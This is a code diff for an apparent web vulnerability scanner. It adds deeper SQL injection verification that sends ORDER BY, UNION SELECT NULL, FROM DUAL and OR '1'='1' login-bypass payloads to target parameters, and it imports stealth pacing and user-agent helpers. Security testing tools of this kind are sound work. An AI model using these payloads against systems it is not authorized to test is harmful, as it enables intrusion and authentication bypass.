@@ -2,7 +2,11 @@ import crypto from 'crypto';
 import { stealthPause, pickStealthUserAgent } from './request-policy.js';
 
 const XSS_PARAM_RE = /^(q|query|search|s|keyword|term|message|comment|title|name)$/i;
-const SQLI_PARAM_RE = /^(id|ids|user|user_id|uid|account|order|order_id|page|sort|filter|where)$/i;
+export const SQLI_PARAM_RE =
+  /^(id|ids|user|user_id|uid|account|order|order_id|page|sort|filter|where|username|email|passwd|pwd|login)$/i;
+/** Paths típicos de formulário de login (prova OR 1=1 só aqui, com verify_sqli_deep). */
+const LOGIN_PATH_RE = /(\/|^)(login|sign-in|signin|auth)(\/|$)/i;
+const AUTH_SQLI_PARAM_RE = /^(user(name)?|email|pass(word)?|login|pwd)$/i;
 const REDIRECT_PARAM_RE = /^(redirect|url|next|return|return_url|dest|target|goto|callback)$/i;
 const IDOR_PARAM_RE = /^(id|user_id|uid|account|order_id|profile_id|invoice_id)$/i;
 const LFI_PARAM_RE = /^(file|path|page|template|include|inc|doc|document|folder|dir|download|view|cat)$/i;
@@ -52,7 +56,7 @@ function sampleSnippet(text, needle, radius = 90) {
   return s.slice(st, en).replace(/\s+/g, ' ').trim();
 }
 
-function evidenceHash(evidence) {
+export function evidenceHash(evidence) {
   const raw = JSON.stringify({
     source: evidence?.source || '',
     url: evidence?.url || '',
@@ -68,11 +72,103 @@ export function responseLooksLikeSqlError(text) {
   return SQL_ERROR_RE.test(String(text || ''));
 }
 
+/** Primeiro índice ORDER BY n em que aparece erro SQL quando o passo anterior não tinha (vs baseline). */
+export function orderByFirstSqlErrorTransition(errBase, snapshots) {
+  let prev = !!errBase;
+  for (const snap of snapshots || []) {
+    const cur = !!snap.sqlErr;
+    if (cur && !prev) return snap.n;
+    prev = cur;
+  }
+  return null;
+}
+
+/** Pequenos sinais por coluna k em UNION SELECT NULL,... (sem exfiltração). */
+export function unionNullProbeSignals(rb, errBase, snapshots) {
+  const bits = [];
+  const baseLen = String(rb?.text || '').length;
+  for (const s of snapshots || []) {
+    if (typeof s.k !== 'number') continue;
+    if (!!s.sqlErr !== !!errBase) bits.push(`k${s.k}:sql_ne_base`);
+    if (baseLen > 80 && s.len > 0) {
+      const ratio = Math.abs(s.len - baseLen) / baseLen;
+      if (ratio > 0.18) bits.push(`k${s.k}:d_body`);
+    }
+  }
+  return bits;
+}
+
 function sqlErrorResponseSnippet(text) {
   const s = String(text || '');
   const m = s.match(SQL_ERROR_RE);
   if (m && m[0]) return sampleSnippet(s, m[0], 140);
   return s.slice(0, 220).replace(/\s+/g, ' ').trim();
+}
+
+/**
+ * Sondas extra (ORDER BY 1..N, UNION NULL×k, NULL FROM DUAL, OR 1=1 em login).
+ * Só com módulo verify_sqli_deep; não enumera information_schema nem sleep.
+ */
+async function collectSqliDeepMeta(u, paramKey, baseVal, auth, modules, rb, errBase) {
+  const bits = [];
+  const orderSnapshots = [];
+  for (let n = 1; n <= 12; n++) {
+    const x = new URL(u.href);
+    x.searchParams.set(paramKey, `${baseVal}' ORDER BY ${n}--+`);
+    try {
+      const r = await fetchText(x.href, { auth, modules });
+      orderSnapshots.push({ n, sqlErr: responseLooksLikeSqlError(r.text), status: r.status });
+    } catch {
+      orderSnapshots.push({ n, sqlErr: false, status: 0 });
+    }
+  }
+  const obErr = orderByFirstSqlErrorTransition(errBase, orderSnapshots);
+  if (obErr != null) bits.push(`orderby_sqlerr@${obErr}`);
+  const stFirst = orderSnapshots.find((s) => s.status > 0 && s.status !== rb.status)?.n;
+  if (stFirst != null) bits.push(`orderby_status@${stFirst}`);
+
+  const unionSnaps = [];
+  for (let k = 1; k <= 6; k++) {
+    const unionSel = Array(k)
+      .fill('NULL')
+      .join(',');
+    const x = new URL(u.href);
+    x.searchParams.set(paramKey, `${baseVal}' UNION SELECT ${unionSel}-- -`);
+    try {
+      const r = await fetchText(x.href, { auth, modules });
+      unionSnaps.push({ k, sqlErr: responseLooksLikeSqlError(r.text), len: r.text.length, status: r.status });
+    } catch {
+      unionSnaps.push({ k, sqlErr: false, len: 0, status: 0 });
+    }
+  }
+  const uBits = unionNullProbeSignals(rb, errBase, unionSnaps);
+  if (uBits.length) bits.push(`union:${uBits.slice(0, 5).join(',')}`);
+
+  const xdu = new URL(u.href);
+  xdu.searchParams.set(paramKey, `${baseVal}' UNION SELECT NULL FROM DUAL-- -`);
+  try {
+    const rd = await fetchText(xdu.href, { auth, modules });
+    const r1 = unionSnaps[0];
+    if (r1 && responseLooksLikeSqlError(rd.text) !== r1.sqlErr) bits.push('dual_sql_ne_k1');
+    else if (r1 && r1.len > 40 && Math.abs(rd.text.length - r1.len) / r1.len > 0.16) bits.push('dual_d_body');
+  } catch {
+    /* ignore */
+  }
+
+  if (LOGIN_PATH_RE.test(u.pathname) && AUTH_SQLI_PARAM_RE.test(String(paramKey).toLowerCase())) {
+    const xa = new URL(u.href);
+    xa.searchParams.set(paramKey, `${baseVal}' OR '1'='1'--+`);
+    try {
+      const ra = await fetchText(xa.href, { auth, modules });
+      const lb = rb.text.length;
+      const la = ra.text.length;
+      if (ra.status !== rb.status || (lb > 80 && Math.abs(la - lb) / lb > 0.12)) bits.push('or_true_delta');
+    } catch {
+      /* ignore */
+    }
+  }
+
+  return bits.length ? bits.join(';') : '';
 }
 
 function collectEndpointUrlsForVerify(findings, maxEndpoints) {
@@ -185,19 +281,36 @@ export async function runEvidenceVerification({ findings, auth, log, maxEndpoint
           const statusDiff = rb.status !== rt.status;
           const classification = errTest && !errBase ? 'confirmed' : statusDiff ? 'probable' : 'noisy';
           const score = classification === 'confirmed' ? 95 : classification === 'probable' ? 72 : 34;
+          let deepSqli = '';
+          if (
+            modules.includes('verify_sqli_deep') &&
+            (classification === 'confirmed' || classification === 'probable')
+          ) {
+            try {
+              deepSqli = await collectSqliDeepMeta(u, p, baseVal, auth, modules, rb, errBase);
+            } catch {
+              /* ignore */
+            }
+          }
+          const metaSqli = [
+            `verify=sqli • param=${p} • probe=${encodeURIComponent(baseVal)}→${encodeURIComponent(testVal)} • sql_error=${errTest ? 'yes' : 'no'} • status_diff=${statusDiff ? 'yes' : 'no'} • confidence=${classification}`,
+            deepSqli ? `deep=${deepSqli}` : '',
+          ]
+            .filter(Boolean)
+            .join(' • ');
           pushVerificationFinding(
             out,
             'sqli',
             classification,
             score,
             `Verify SQLi ${classification.toUpperCase()} @ ${t.pathname} ?${p}=`,
-            `verify=sqli • param=${p} • probe=${encodeURIComponent(baseVal)}→${encodeURIComponent(testVal)} • sql_error=${errTest ? 'yes' : 'no'} • status_diff=${statusDiff ? 'yes' : 'no'} • confidence=${classification}`,
+            metaSqli,
             {
               source: 'verify-sqli',
               url: t.href,
               method: 'GET',
               status: rt.status,
-              requestSnippet: `${t.pathname}?${p}=${testVal}`,
+              requestSnippet: `${t.pathname}?${p}=${testVal}${deepSqli ? ` (+deep: ORDER BY… UNION…)` : ''}`,
               responseSnippet: sqlErrorResponseSnippet(rt.text),
               timestamp: nowIso(),
             },
